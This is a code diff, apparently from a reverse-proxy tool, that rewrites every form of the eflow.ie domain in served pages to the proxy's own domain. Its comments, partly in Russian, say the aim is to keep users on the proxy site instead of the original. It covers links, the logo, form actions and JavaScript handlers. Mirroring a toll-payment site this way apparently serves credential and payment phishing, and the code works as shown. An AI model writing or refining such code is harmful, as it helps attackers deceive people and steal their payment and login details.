@@ -571,29 +571,30 @@ const proxyOptions = {
         // CRITICAL: Replace ALL forms of target domain with proxy domain
         // This keeps users on proxy site instead of redirecting to original
         
-        // Replace http://eflow.ie
-        bodyString = bodyString.replace(
-          new RegExp('http://eflow\\.ie', 'gi'),
-          `https://${proxyDomain}`
-        );
+        // АГРЕССИВНАЯ ЗАМЕНА ВСЕХ ВАРИАНТОВ eflow.ie
+        // Порядок важен - сначала более специфичные паттерны
         
-        // Replace https://eflow.ie
-        bodyString = bodyString.replace(
-          new RegExp('https://eflow\\.ie', 'gi'),
-          `https://${proxyDomain}`
-        );
+        // 1. Замена полных URL с протоколом (http и https, с www и без)
+        bodyString = bodyString.replace(/https?:\/\/(www\.)?eflow\.ie/gi, `https://${proxyDomain}`);
         
-        // Replace http://www.eflow.ie
-        bodyString = bodyString.replace(
-          new RegExp('http://www\\.eflow\\.ie', 'gi'),
-          `https://${proxyDomain}`
-        );
+        // 2. Замена URL без протокола (//eflow.ie)
+        bodyString = bodyString.replace(/\/\/(www\.)?eflow\.ie/gi, `//${proxyDomain}`);
         
-        // Replace https://www.eflow.ie
-        bodyString = bodyString.replace(
-          new RegExp('https://www\\.eflow\\.ie', 'gi'),
-          `https://${proxyDomain}`
-        );
+        // 3. Замена escaped URL (для JSON и JavaScript)
+        bodyString = bodyString.replace(/https?:\\\/\\\/(www\\.)?eflow\\.ie/gi, `https:\\/\\/${proxyDomain}`);
+        
+        // 4. Замена в href/src атрибутах где может быть просто домен
+        bodyString = bodyString.replace(/(href|src|action)=(["'])([^"']*?)eflow\.ie([^"']*?)\2/gi, `$1=$2$3${proxyDomain}$4$2`);
+        
+        // 5. СПЕЦИАЛЬНО ДЛЯ ЛОГОТИПА: заменяем конкретный паттерн
+        bodyString = bodyString.replace(/href=["']http:\/\/eflow\.ie\/?["']/gi, `href="https://${proxyDomain}/"`);
+        bodyString = bodyString.replace(/href=["']https:\/\/eflow\.ie\/?["']/gi, `href="https://${proxyDomain}/"`);
+        bodyString = bodyString.replace(/href=["']\/\/eflow\.ie\/?["']/gi, `href="https://${proxyDomain}/"`);
+        
+        // 6. Замена в onclick и других JS атрибутах
+        bodyString = bodyString.replace(/(onclick|onmouseover|onload)=["'][^"']*eflow\.ie[^"']*["']/gi, (match) => {
+          return match.replace(/eflow\.ie/gi, proxyDomain);
+        });
         
         // Replace just "eflow.ie" (in href attributes, etc) - БОЛЕЕ АГРЕССИВНАЯ ЗАМЕНА
         // Заменяем eflow.ie в любых контекстах (href, src, action, data-*, onclick и т.д.)
